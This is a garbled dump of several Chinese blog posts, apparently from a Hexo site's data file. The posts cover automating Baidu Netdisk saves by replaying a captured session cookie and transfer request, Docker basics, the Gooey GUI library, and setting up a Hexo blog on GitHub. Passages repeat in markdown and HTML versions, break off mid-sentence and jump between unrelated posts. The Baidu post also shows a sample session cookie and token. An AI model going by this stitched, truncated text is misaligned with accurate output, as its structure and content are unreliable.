class=\"blockquote-center\">为了荣誉而战</blockquote>\n　　事情的起因是这样的，由于我想找几部经典电影欣赏欣赏，于是便向某老司机寻求资源（我备注了需要正规视频，绝对不是他想的那种资源），然后他丢给了我一个视频资源网站，说是比较有名的视频资源网站。我信以为真，便激动地点开寻求经典电影，于是便引出了一段经典的百度网盘之战。\n<!--more -->\n免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，文章出现的截图只做样例演示，请勿非法使用*\n先来看下这个视频网站的截图：\n![](/upload_image/20170412/3.png)\n不得不说，这是一个正规的网站，正规的视频，只是看着标题的我想多了而已。\n怀着满满的求知欲，我点开了链接，并在网页下方看到了视频资源链接。\n![](/upload_image/20170412/4.png)\n　　这里有2种资源，一种是百度网盘，另一种是迅雷种子，不得不说这个网站还是比较良心，相较于只发图不留种的某些网站。按照正常逻辑，此时我应该点开资源地址静静地欣赏起来（不对，其实我不是那样的人），因此我选择默默地将资源添加到网盘收藏。看到网盘又多了几部佳作，心情顿时爽了很多，但仅仅添加几部作品并没有满足我的收藏欲望，于是我便开始探索如何快速将视频资源自动添加到百度网盘，也由此引发了我对于百度网盘的一系列斗争。\n\n### 战争序幕\n首先通过观察该网站url构成，以及网页源码组成，我决定采用爬取的方式采集资源链接地址。\n网页截图：\n![](/upload_image/20170412/5.png)\n该过程并没有遇到很大的问题，我采用了python+协程的方式进行采集，很快便获取了一部分资源地址：\n百度网盘资源地址：\n![](/upload_image/20170412/6.png)\n\n　　写完采集数据脚本，采集完部分数据已是晚上11点，原本应该洗洗睡了，然而技术探索的力量鼓舞着我继续前行。目前资源地址都有了，然而对于百度网盘资源，仍然需要一一点开，然后添加到我的网盘，此步骤太耗费精神，因此我决定继续挖掘自动添加资源到百度网盘的方法。\n\n*注意：以下内容是本文的重点技术内容，关乎着我与百度网盘一战的最终结局，请勿走开，精彩继续。*\n\n### 终极之战\n首先我通过抓包，查看源码，审查元素等方式分析了百度分享页面的特征，判断其是否适合爬虫方式。\n![](/upload_image/20170412/33.png)\n在经过一系列测试之后，我发现虽然过程有点曲折，但还是可以用爬虫的方式实现自动化的添加资源到网盘。\n\n要实现这一技术，我总结了以下几点流程：\n\n* 获取用户cookie（可以手动登录然后抓包获取）\n* 首先爬取如：*http://pan.baidu.com/s/1o8LkaPc*网盘分享页面，获取源码。\n* 解析源码，筛选出该页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）。\n* 构造post包（用来添加资源到网盘），该包需要用到以上4个参数+cookies。\n\n#### 获取cookie\n抓取cookie可以用很多工具，我用了火狐的Tamper插件，效果如下：\n获取登录的数据包：\n![](/upload_image/20170412/1.png)\n查看登录发送的请求包，发现有账号密码，当然我们这里需要的是cookie，可以在response中查看到。\n![](/upload_image/20170412/2.png)\n\ncookie的格式如下：\n```bash\nBAIDUID=52C3FE49FD82573C4ABCEAC5E77800F6:FG=1;

访问百度资源分享页面\n　　请求页面如：http://pan.baidu.com/s/1o8LkaPc\n　　获取cookie以后，可以在访问百度资源分享页面时，在headers里面写入cookie值，并使用该cookie登录，期间我也失败过几次，原因还是需要加上其他header参数（如果不加cookie参数，返回的结果将是\"页面不存在\"）。\n　　请求成功之后，我们可以在源码中找到一些我们需要的内容，比如页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）值。\n\n#### 构造添加资源POST包\n首先看下post包的构造：\n```bash\nPOST https://pan.baidu.com/share/transfer?shareid=2337815987&from=1612775008&bdstoken=6e05f8ea7dcb04fb73aa975a4eb8ae6c&channel=chunlei&clienttype=0&web=1&app_id=250528&logid= HTTP/1.1\nHost:

最终返回内容\n```bash\n{\"errno\":0,\"task_id\":0,\"info\":[{\"path\":\"\\/\\u5a31\\u4e50\\u6e38\\u620f\\/\\u4e09\\u56fd\\u5168\\u6218\\u6218\\u68cb1.4\\u516d\\u53f7\\u7248\\u672c.rar\",\"errno\":0}],\"extra\":{\"list\":[{\"from\":\"\\/\\u5a31\\u4e50\\u6e38\\u620f\\/\\u4e09\\u56fd\\u5168\\u6218\\u6218\\u68cb1.4\\u516d\\u53f7\\u7248\\u672c.rar\",\"to\":\"\\/\\u4e09\\u56fd\\u5168\\u6218\\u6218\\u68cb1.4\\u516d\\u53f7\\u7248\\u672c.rar\"}]}}\n```\n最终如果看到以上内容，说明资源已经成功添加到网盘，如果errno为其他值，则说明出现了错误，12代表资源已经存在。\n\n\n###

class=\"blockquote-center\">为了荣誉而战</blockquote>\n　　事情的起因是这样的，由于我想找几部经典电影欣赏欣赏，于是便向某老司机寻求资源（我备注了需要正规视频，绝对不是他想的那种资源），然后他丢给了我一个视频资源网站，说是比较有名的视频资源网站。我信以为真，便激动地点开寻求经典电影，于是便引出了一段经典的百度网盘之战。\n<!--more

战争序幕\n首先通过观察该网站url构成，以及网页源码组成，我决定采用爬取的方式采集资源链接地址。\n网页截图：\n![](/upload_image/20170412/5.png)\n该过程并没有遇到很大的问题，我采用了python+协程的方式进行采集，很快便获取了一部分资源地址：\n百度网盘资源地址：\n![](/upload_image/20170412/6.png)\n\n　　写完采集数据脚本，采集完部分数据已是晚上11点，原本应该洗洗睡了，然而技术探索的力量鼓舞着我继续前行。目前资源地址都有了，然而对于百度网盘资源，仍然需要一一点开，然后添加到我的网盘，此步骤太耗费精神，因此我决定继续挖掘自动添加资源到百度网盘的方法。\n\n*注意：以下内容是本文的重点技术内容，关乎着我与百度网盘一战的最终结局，请勿走开，精彩继续。*\n\n### 终极之战\n首先我通过抓包，查看源码，审查元素等方式分析了百度分享页面的特征，判断其是否适合爬虫方式。\n![](/upload_image/20170412/33.png)\n在经过一系列测试之后，我发现虽然过程有点曲折，但还是可以用爬虫的方式实现自动化的添加资源到网盘。\n\n要实现这一技术，我总结了以下几点流程：\n\n* 获取用户cookie（可以手动登录然后抓包获取）\n* 首先爬取如：*http://pan.baidu.com/s/1o8LkaPc*网盘分享页面，获取源码。\n* 解析源码，筛选出该页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）。\n* 构造post包（用来添加资源到网盘），该包需要用到以上4个参数+cookies。\n\n####

class=\"blockquote-center\">为了荣誉而战</blockquote><br>　　事情的起因是这样的，由于我想找几部经典电影欣赏欣赏，于是便向某老司机寻求资源（我备注了需要正规视频，绝对不是他想的那种资源），然后他丢给了我一个视频资源网站，说是比较有名的视频资源网站。我信以为真，便激动地点开寻求经典电影，于是便引出了一段经典的百度网盘之战。<br>","more":"<br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，文章出现的截图只做样例演示，请勿非法使用</em><br>先来看下这个视频网站的截图：<br><img src=\"/upload_image/20170412/3.png\" alt=\"\"><br>不得不说，这是一个正规的网站，正规的视频，只是看着标题的我想多了而已。<br>怀着满满的求知欲，我点开了链接，并在网页下方看到了视频资源链接。<br><img src=\"/upload_image/20170412/4.png\" alt=\"\"><br>　　这里有2种资源，一种是百度网盘，另一种是迅雷种子，不得不说这个网站还是比较良心，相较于只发图不留种的某些网站。按照正常逻辑，此时我应该点开资源地址静静地欣赏起来（不对，其实我不是那样的人），因此我选择默默地将资源添加到网盘收藏。看到网盘又多了几部佳作，心情顿时爽了很多，但仅仅添加几部作品并没有满足我的收藏欲望，于是我便开始探索如何快速将视频资源自动添加到百度网盘，也由此引发了我对于百度网盘的一系列斗争。</p>\n<h3 id=\"战争序幕\"><a href=\"#战争序幕\" class=\"headerlink\" title=\"战争序幕\"></a>战争序幕</h3><p>首先通过观察该网站url构成，以及网页源码组成，我决定采用爬取的方式采集资源链接地址。<br>网页截图：<br><img src=\"/upload_image/20170412/5.png\" alt=\"\"><br>该过程并没有遇到很大的问题，我采用了python+协程的方式进行采集，很快便获取了一部分资源地址：<br>百度网盘资源地址：<br><img src=\"/upload_image/20170412/6.png\" alt=\"\"></p>\n<p>　　写完采集数据脚本，采集完部分数据已是晚上11点，原本应该洗洗睡了，然而技术探索的力量鼓舞着我继续前行。目前资源地址都有了，然而对于百度网盘资源，仍然需要一一点开，然后添加到我的网盘，此步骤太耗费精神，因此我决定继续挖掘自动添加资源到百度网盘的方法。</p>\n<p><em>注意：以下内容是本文的重点技术内容，关乎着我与百度网盘一战的最终结局，请勿走开，精彩继续。</em></p>\n<h3 id=\"终极之战\"><a href=\"#终极之战\" class=\"headerlink\" title=\"终极之战\"></a>终极之战</h3><p>首先我通过抓包，查看源码，审查元素等方式分析了百度分享页面的特征，判断其是否适合爬虫方式。<br><img src=\"/upload_image/20170412/33.png\" alt=\"\"><br>在经过一系列测试之后，我发现虽然过程有点曲折，但还是可以用爬虫的方式实现自动化的添加资源到网盘。</p>\n<p>要实现这一技术，我总结了以下几点流程：</p>\n<ul>\n<li>获取用户cookie（可以手动登录然后抓包获取）</li>\n<li>首先爬取如：<em><a href=\"http://pan.baidu.com/s/1o8LkaPc\">http://pan.baidu.com/s/1o8LkaPc</a></em>网盘分享页面，获取源码。</li>\n<li>解析源码，筛选出该页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）。</li>\n<li>构造post包（用来添加资源到网盘），该包需要用到以上4个参数+cookies。</li>\n</ul>\n<h4 id=\"获取cookie\"><a href=\"#获取cookie\" class=\"headerlink\" title=\"获取cookie\"></a>获取cookie</h4><p>抓取cookie可以用很多工具，我用了火狐的Tamper插件，效果如下：<br>获取登录的数据包：<br><img src=\"/upload_image/20170412/1.png\" alt=\"\"><br>查看登录发送的请求包，发现有账号密码，当然我们这里需要的是cookie，可以在response中查看到。<br><img src=\"/upload_image/20170412/2.png\" alt=\"\"></p>\n<p>cookie的格式如下：<br><figure class=\"highlight bash\"><table><tr><td

class=\"blockquote-center\">人生如戏，而你是若不是演员？</blockquote>\n　　最近玩了玩Docker，感觉还不错，在此记录分享下docker的一些基础用法。本篇内容会随着本人对docker的不断地深入研究使用而补充，也欢迎大家纠错。\n　　Docker的优点这里不再细说，docker的用途非常广，我最近准备使用它搭建测试环境（漏洞测试环境、开发测试环境等），还可以用来部署分布式项目（可以极大程度得利用服务器资源），当然docker的用途还有很多，这里不再详述。\n<!--more -->\n### docker 介绍\n* docker客户端与服务器（守护进程）\n* docker镜像（image)\n* registry\n* docker容器(container)\n\n　　docker容器是构建在镜像之上的，我们可以将image理解为定义好的类，而container便是实例，一个类可以实例化出很多实例，同样docker也可以在镜像上运行多个容器，每个容器可以是一样的，也可以是定制化的。docker客户端与服务器可以运行在同一台宿主机上，也可以不同。\n　　registry用于保存用户的镜像，它分为公有与私有。docker公司运营的公共registry叫做docker hub,用户可以在docker hub上注册账号，分享并保存自己的镜像。\n### docker install\ndocker可以运行在linux、mac、windows上。\n#### install docker for mac\n前往官网下载安装包：https://www.docker.com/products/docker#/mac\n下载完以后直接安装，安装完成后运行docker run hello-world，如果没有报错，说明安装成功。\n更换镜像源（填写国内的镜像源）：\n![](/upload_image/20170504/1.png)\n#### install docker for linux\n安装dokcer:\n```bash\nsudo yum -y install docker-io\n```\n启动docker守护进程：\n```bash\nsudo service docker enable(start)\nsudo /etc/init.d/docker start\n```\n开机自启动：\n```bash\nsudo systemctl start(enable) docker\n```\n\n### 更换国内镜像\n推荐使用阿里云镜像，地址:http://dev.aliyun.com/search.html\n注册一个账号登录后，进入控制台加速器，会得到一个镜像地址，将该地址添加到/etc/default/docker文件，重启docker服务即可。\n\n### docker 基础命令\n　　docker基础命令包含docker操作、镜像操作、容器操作以及其他相关操作，以下列举了一些常用的命令，更多请参考官方文档，或者使用--help命令查看。\n#### docker操作\n查看docker信息\n```bash\n$docker info\nContainers: 1  #1个容器\n Running: 1    #1个容器正在运行\n Paused: 0\n Stopped: 0\nImages: 5   #5个镜像\nServer Version: 1.12.3\n......\n```\n查看docker版本\n```bash\n$docker -v\nDocker version 1.12.3, build 6b644ec\n$docker version\nClient:\n Version:      1.12.3\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   6b644ec\n Built:        Wed Oct 26 23:26:11 2016\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.12.3\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   6b644ec\n Built:        Wed Oct 26 23:26:11 2016\n OS/Arch:      linux/amd64\n```\n#### 镜像操作\n本地镜像都保存在/var/lib/docker目录下。\n查看本地镜像列表:\n```bash\ndocker images -a  #-a可以查看所有的image\n```\n![](/upload_image/20170504/4.png)\n其他镜像操作：\n```bash\ndocker search (image-name) 查询镜像 example：docker search ubuntu\ndocker history (image-name) 查看镜像的历史版本\ndocker push (image-name) 将镜像推送到registry\ndocker pull image-name:tag pull镜像 example:docker pull ubuntu:latest\ndocker rmi  <image id>   删除镜像（先stop并删除镜像上的所有容器）\ndocker rmi $(docker images -q) 删除全部镜像\ndocker tag image-id imagename:tag 修改镜像的tag标签\ndocker load -i test.tar 从tar文件中载入镜像\ndocker save image > test.tar 保存镜像为tar文件\n```\n#### 容器操作\n创建容器：\n```bash\ndocker run --rm -ti ubuntu /bin/bash\n```\n* --rm   一旦进程退出，则删除容器\n* -ti    进入交互模式\n* ubuntu 容器立足的镜像名字\n* /bin/bash  要运行的命令\n\n```bash\ndocker run -d -p 8000:80 --name test image-name\n```\n* -d   后台运行\n* -p   映射的端口,:前为本机，后为容器\n* --name 自定义名称\n\n注意：创建容器以后， 会返回一个ID，是随机生成的。\n\n检查容器运行状态：\n```bash\ndocker ps -a（显示所有容器，包括已经stop的）\n```\n![](/upload_image/20170504/5.png)\n\n查看容器具体信息：\n```bash\ndocker inspect 容器id(容器名)\n```\n比ps -a命令更详细，包含网络信息、配置信息等内容，可以用-forma匹配出来，如：\n```bash\nsudo docker inspect --format '{{ .NetworkSettings.IPAddress }}' c18acd6a8a32 #查看容器ip地址\n```\n\n查看容器内进程：\n```bash\ndocker top 容器id\n```\n\n进入容器内部：\n```bash\nsudo docker attach 容器id\n```\n或者可以使用：\n```bash\ndocker exec -ti 容器name /bin/bash\n```\nexec命令可以在容器内部执行命令，以上代码表示在容器内新建一个shell。\n\n退出容器：\n```bash\n[rootq3e1]exit\n```\n重启容器：\n```bash\ndocker run —restart=always\n```\nrestart参数可以设置以下内容：\n* always 无论容器内退出什么代码程序，都会重启docker容器\n* on-failure 可以指定退出代码\n\n更多容器操作：\n```bash\ndocker attach container 进入容器交互式界面\ndocker diff  container 列出容器内发生变化的文件与目录\ndcoker logs ID(容器的ID，可以用docker ps查看)   查看docker上的容器的状态\ndocker stop ID(或者容器名字)  关闭运行中的容器\ndocker start ID 开启容器\ndocker restart ID  重启运行中的容器\ndocker stop ID docker rm ID  移除容器（先关闭再删除）\ndocker kill [options] container 杀死容器的主进程\ndocker stop $(docker ps -a -q) 停止所有container\ndocker rm $(docker ps -a -q)   移除所有container\ndocker commit ID new镜像名字（只能字母加数字） 将容器的状态保存为镜像\ndocker export container > test.tar  将容器打包成tar文件\ndocker cp container:path hostpath  从容器内复制文件到指定的路径\n```\n\n容器网络管理：（感谢@DarkEvil补充分享）\n* host模式，使用dockerrun时使用--net=host指定（docker使用的网络实际上和宿主机一样，在容器内看到的网卡ip是宿主机上的ip）\n* container模式，使用--net=container:container_id/container_name（多个容器使用共同的网络，看到的ip是一样的）\n* none模式，使用--net=none指定（这种模式下，不会配置任何网络）\n* bridge模式，使用--net=bridge指定\n* 默认模式，不用指定默认就是这种网络模式。（这种模式会为每个容器分配一个独立的Network Namespace。类似于vmware的nat网络模式。同一个宿主机上的所有容器会在同一个网段下，相互之间是可以通信的。）\n\n#### other操作\n```bash\ndocker import http://example.com/example.tar  远程导入文件\ndocker login [options][server]  用来登陆自己的registry\ndocker inspect container/image  收集容器的信息（ip地址，端口等）\ndocker wait container  阻塞\n```\n### dockerfile\n　　dockerfile可以用来动态生成新的镜像，比如说我们pull了一个基础的centos镜像，现在需要在此镜像内安装一些软件，以便可以顺利运行我们准备的项目代码，那么可以使用以下2种方案：\n#### 方案一：（手动式）\n　　在centos镜像上创建一个容器，进入容器交互式界面后，手动安装一些需要的软件，配置好环境。当做好所有的修改后，使用docker commit container-id newimagename创建新的镜像。再使用新的镜像来创建容器，运行我们的项目代码。\n#### 方案二：（自动式）\n　　所谓自动化，就是不需要进入容器手动输入命令进行配置，一切都在容器运行时自动处理，那么这就要用到dockerfile了。dockerfile简单来说就是一个配置文件，docker容器在运行时会处理这个文件内容，比如安装软件，修改环境变量，运行程序等。使用dockerfile的好处在于可以很方便的修改配置文件内容，达到创建动态镜像的效果。\n#### 创建dockerfile\n　　我们需要创建一个目录来存放Dockerfile文件，目录名称可以任意取，在该目录里创建Dockerfile文件。这里我以创建一个基于centos基础镜像，容器运行后会自动开启一个python webserver（本地监听8080端口）的例子。\n#### 编写dockerfile\n在Dockerfile文件内写入：\n```bash\n# Version 0.1\n# 基础镜像\nFROM centos:latest\n# 维护者信息\nMAINTAINER http://thief.one\n# 镜像操作命令\nRUN yum install wget\n# 容器启动命令\nCMD python -m SimpleHTTPServer 8080\n```\ndockerfile语法类似于MakeDown，基础内容如下：\n* FROM 基于的基础镜像名称\n* MAINTAINER 维护者信息\n* RUN 运行的命令（安装软件等）\n* CMD 启动容器时运行的命令（只能写一条）\n\n语法不止这些，更多内容，可以参考官方文档。\n#### 生成dockerfile镜像\n进入到Dockerfile文件所在目录，运行：\n```bash\ndocker build -t centos_test:01 .\n或者\ndocker build -t centos_test:01 git@github:......(远程git地址)\n```\n此时，运行docker images -a查看，会发现多了一个image，名称为centos_test，tag为01\n![](/upload_image/20170504/2.png)\n如果dockerfile写得有问题，在build时会报错，这时可以通过docker run 容器id 进入最后状态的容器去调试。\n#### 使用dockerfile镜像\n在此image上运行容器：\n```bash\ndocker run -d -p 80:8080 centos_test:0.1\n```\n此时，打开本机的127.0.0.1:80\n![](/upload_image/20170504/3.png)\n\n### dockerfile规则\n每条指令都必须为大写字母，如FROM、RUN，且后面要跟一个内容，docker file会按从上往下的顺序执行这些内容。\n#### WORKDIR\n作用：设置工作目录，类似cd\n```bash\nWORKDIR /root/\nRUN apt-get install pip\nWORKDIR /root/test\n......\n```\n可以使用-w参数覆盖容器工作目录\n```bash\ndocker run -w /root/nmasktools ......\n```\n#### ENV\n作用：设置容器内的环境变量\n可以用-e来覆盖。\n#### USER\n作用：指定以什么样的用户去运行容器\n```bash\nUSER nmask（用户名或者id）\n```\n可以使用 docker -u 来覆盖。\n#### ADD、COPY\nadd与copy都是用来向镜像中添加文件的，区别在于copy只能复制文件，而没有解压功能。\n\n\n*docker的内容非常多，以上只是一些最基础的用法，本文也将会持续更新*\n\n>转载请说明出处：[Docker基础总结|nMask'Blog](http://thief.one/2017/05/04/1)\n本文地址：http://thief.one/2017/05/04/1","source":"_posts/Docker基础总结.md","raw":"---\ntitle:

href=\"#方案一：（手动式）\" class=\"headerlink\" title=\"方案一：（手动式）\"></a>方案一：（手动式）</h4><p>　　在centos镜像上创建一个容器，进入容器交互式界面后，手动安装一些需要的软件，配置好环境。当做好所有的修改后，使用docker commit container-id newimagename创建新的镜像。再使用新的镜像来创建容器，运行我们的项目代码。</p>\n<h4 id=\"方案二：（自动式）\"><a href=\"#方案二：（自动式）\" class=\"headerlink\" title=\"方案二：（自动式）\"></a>方案二：（自动式）</h4><p>　　所谓自动化，就是不需要进入容器手动输入命令进行配置，一切都在容器运行时自动处理，那么这就要用到dockerfile了。dockerfile简单来说就是一个配置文件，docker容器在运行时会处理这个文件内容，比如安装软件，修改环境变量，运行程序等。使用dockerfile的好处在于可以很方便的修改配置文件内容，达到创建动态镜像的效果。</p>\n<h4 id=\"创建dockerfile\"><a href=\"#创建dockerfile\" class=\"headerlink\"

href=\"#方案一：（手动式）\" class=\"headerlink\" title=\"方案一：（手动式）\"></a>方案一：（手动式）</h4><p>　　在centos镜像上创建一个容器，进入容器交互式界面后，手动安装一些需要的软件，配置好环境。当做好所有的修改后，使用docker commit container-id newimagename创建新的镜像。再使用新的镜像来创建容器，运行我们的项目代码。</p>\n<h4 id=\"方案二：（自动式）\"><a href=\"#方案二：（自动式）\" class=\"headerlink\" title=\"方案二：（自动式）\"></a>方案二：（自动式）</h4><p>　　所谓自动化，就是不需要进入容器手动输入命令进行配置，一切都在容器运行时自动处理，那么这就要用到dockerfile了。dockerfile简单来说就是一个配置文件，docker容器在运行时会处理这个文件内容，比如安装软件，修改环境变量，运行程序等。使用dockerfile的好处在于可以很方便的修改配置文件内容，达到创建动态镜像的效果。</p>\n<h4 id=\"创建dockerfile\"><a href=\"#创建dockerfile\" class=\"headerlink\"

GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数---GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。\n\n### 安装Gooey\n最简单的安装方法：\n```bash\npip install Gooey\n```\n或者：\n```bash\ngit clone https://github.com/chriskiehl/Gooey.git\n```\n然后运行setup.py :\n```bash\npython setup.py install\n```\n相关依赖：\nwxpython\n安装：pip install wxpython (windows下需要去官网下载安装包)\n\n###

advanced config or not \n       language=language_string,  # Translations configurable via json\n       show_config=True,          # skip config screens all together\n       program_name='name',

languages\n)\n```\n参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)\n```bash\n@Gooey(program_name=u'这是一个测试脚本',default_size=(500,500))\ndef main():\n\tparser = argparse.ArgumentParser(description=u\"测试描述内容\")\n\tparser.add_argument(\"test\",help=\"this is a test\" )\n\targs=parser.parse_args()\n\tprint args\n\nif __name__==\"__main__\":\n\tmain()\n```\n运行截图：\n![](/upload_image/20170215/2.png)\n\n### 使用GooeyParse\n简单例子：\n```bash\nfrom gooey import Gooey, GooeyParser\n\n@Gooey(program_name=\"test\",image_dir=\".\\image\") ##注意斜杠\ndef main():\n    parser=GooeyParser(description=u\"测试\")\n    ##文本输入框\n    parser.add_argument(\"test\",help=\"this is a test\")\n    ##选择框\n    parser.add_argument(\n     \"test2\",\n     metavar='Should I exlode?',   ##描述内容\n     help=\"this is test2\",         ##帮助内容\n     choices=[\"Yes\",\"No\"],         ##选择框\n     default=\"Yes\"                 ##默认值\n     )\n    ##复选框\n    parser.add_argument(\n       '-f','--foo',\n       metavar=\"some flag\",\n       action=\"store_true\",        ##参数类型\n       help=\"\")\n    ##文本选择按钮\n    parser.add_argument('filename', metavar=u\"文件选择\",help=\"name of the file to process\", widget='FileChooser') #文本选择按钮\n    parser.add_argument('datetime', metavar=u\"时间选择\",help=\"date to process\",widget='DateChooser',default=\"2017-02-15\") #时间选择按钮\n    args=parser.parse_args()\n    print args\n\nif __name__==\"__main__\":\n     main()\n```\n运行截图：\n![](/upload_image/20170215/3.png)\n说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中'test'对应前者，'-test'对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。\n\nimage目录下图片文件名，分别用来覆盖界面上的图片：\n* program_icon.ico  　　ico图标\n* success_icon.png  　　运行成功的图标\n* running_icon.png  　　正在运行时的图标\n* loading_icon.gif  　　加载时的图标\n* config_icon.png   　　配置图片\n* error_icon.png    　　出错时的图片\n\naction内容表示参数类型，分别对应着wxpython相应的控件：\n\n* store 　　TextCtrl\n* store_const 　　CheckBox\n* store_true  　　CheckBox\n* store_False 　　CheckBox\n* append      　　TextCtrl\n* count       　　DropDown\n* Mutually Exclusive Group  　　RadioGroup\n* chooice     　　DropDown\n\n除了action之外，Gooey还提供了一些小工具（Widgets）\n* DirChooser   　　目录选择按钮工具\n* FileChooser  　　文件选择按钮工具\n* DateChooser  　　时间选择按钮工具\n\n### 优缺点\n　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。\n\n\n参考文档：\nGitHub地址:[https://github.com/chriskiehl/Gooey](https://github.com/chriskiehl/Gooey)\n官方例子：[https://github.com/chriskiehl/GooeyExamples/tree/master/examples](https://github.com/chriskiehl/GooeyExamples/tree/master/examples)\n官方文档：[https://github.com/chriskiehl/Gooey#how-does-it-work](https://github.com/chriskiehl/Gooey#how-does-it-work)\n\n\n\n\n\n\n\n\n","source":"_posts/Gooey魔法.md","raw":"---\ntitle:

main()\n```\n运行截图：\n![](/upload_image/20170215/3.png)\n说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional

优缺点\n　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。\n\n\n参考文档：\nGitHub地址:[https://github.com/chriskiehl/Gooey](https://github.com/chriskiehl/Gooey)\n官方例子：[https://github.com/chriskiehl/GooeyExamples/tree/master/examples](https://github.com/chriskiehl/GooeyExamples/tree/master/examples)\n官方文档：[https://github.com/chriskiehl/Gooey#how-does-it-work](https://github.com/chriskiehl/Gooey#how-does-it-work)\n\n\n\n\n\n\n\n\n","slug":"Gooey魔法","published":1,"updated":"2017-04-10T11:52:04.327Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mmx2w6000bnkliclt6krsc","content":"<p>　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个

class=\"blockquote-center\">所谓博客，都是孤芳自赏\n</blockquote>\n现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。\n<!-- more -->\n### 准备工作\n\n* 下载node.js并安装（官网下载安装），默认会安装npm。\n* 下载安装git（官网下载安装）\n* 下载安装hexo。方法：打开cmd 运行*npm install -g hexo*（要翻墙） \n\n### 本地搭建hexo静态博客\n\n* 新建一个文件夹，如MyBlog\n* 进入该文件夹内，右击运行git，输入：*hexo init*（生成hexo模板，可能要翻墙）\n* 生成完模板，运行*npm install*（目前貌似不用运行这一步）\n* 最后运行：*hexo server* （运行程序，访问本地localhost:4000可以看到博客已经搭建成功）\n\n### 将博客与Github关联\n\n* 在Github上创建名字为XXX.github.io的项目，XXX为自己的github用户名。\n\n* 打开本地的MyBlog文件夹项目内的_config.yml配置文件，将其中的type设置为git\n\n```bash\n  deploy:\n    type: git\n    repository: https://github.com/tengzhangchao/tengzhangchao.github.io.git\n    branch: master\n```\n\n* 运行：*npm install hexo-deployer-git --save*\n* 运行：*hexo g*（本地生成静态文件）\n* 运行：*hexo d*（将本地静态文件推送至Github）\n\n此时，打开浏览器，访问*http://tengzhangchao.github.io*\n\n### 绑定域名\n\n　　博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。\n\n* 域名提供商设置\n\n  添加2条A记录：\n\n  @--->192.30.252.154\n\n  @--->192.30.252.153\n\n  添加一条CNAME记录：\n\n  CNAME--->tengzhangchao.github.io\n\n* 博客添加CNAME文件\n\n  配置完域名解析后，进入博客目录，在source目录下新建CNAME文件，写入域名，如：thief.one\n\n* 运行：*hexo g*\n* 运行：*hexo d*\n\n\n### 更新博客内容\n\n　　至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。\n\n#### 更新文章\n\n* 在MyBlog目录下执行：*hexo new \"我的第一篇文章\"*，会在source->_posts文件夹内生成一个.md文件。\n* 编辑该文件（遵循Markdown规则）\n* 修改起始字段\n  * title    文章的标题  \n  * date    创建日期    （文件的创建日期 ）\n  * updated    修改日期   （ 文件的修改日期）   \n  * comments    是否开启评论    true  \n  * tags    标签   \n  * categories    分类   \n  * permalink    url中的名字（文件名）\n* 编写正文内容（MakeDown）\n* hexo clean 删除本地静态文件（Public目录），可不执行。\n* hexo g 生成本地静态文件（Public目录）\n* hexo deploy 将本地静态文件推送至github（hexo d）\n\n#### 添加菜单\n\n进入theme目录，编辑_config_yml文件，找到menu:字段，在该字段下添加一个字段。\n\n```bash\nmenu:\n  home: /\n  about: /about\n  ......\n```\n\n然后找到lanhuages目录，编辑zh-Hans.yml文件：\n\n```bash\nmenu:\n  home: 首页\n  about: 关于作者\n  ......\n```\n\n更新页面显示的中文字符，最后进入theme目录下的Source目录，新增一个about目录，里面写一个index.html文件。\n\n\n#### 文章内插入图片\n\n在文章中写入:\n\n```bash\n![](/upload_image/1.jpg)\n```\n\n　　然后进入themes-主题名-source-upload_image目录下(自己创建)，将图片放到这个目录下，就可以了。\n\n说明：当执行hexo g命令时，会自动把图片复制到 public文件的upload_image目录下。\n\n\n### 个性化设置\n\n#### 基本信息\n\n　　在根目录下的_config.yml文件中，可以修改标题，作者等信息。打开编辑该文件，注意：每一个值的冒号后面都有一个半角空格！\n\n* 未生效的写法：title:nMask的博客\n* 能生效的写法：title:[空格]nMask的博客\n\n#### 主题\n\n访问[主题列表](http://www.zhihu.com/question/24422335)，获取主题代码。\n\n进入themes目录，进入以下操作：\n\n* 下载主题 (以next主题为例)\n```bash\ngit clone https://github.com/iissnan/hexo-theme-next.git（主题的地址）\n```\n* 打开__config.yml文件，将themes修改为next（下载到的主题文件夹的名字）\n* hexo g\n* hexo d\n\n关于hexo-next主题下的一些个性化配置，参考：[Next主题配置](http://theme-next.iissnan.com/)\n\n### 主题美化\n\n#### 文章中添加居中模块\n文章Markdown中填写如下：\n````bash\n<blockquote class=\"blockquote-center\">优秀的人，不是不合群，而是他们合群的人里面没有你</blockquote>\n```\n#### 鼠标点击小红心的设置\n将 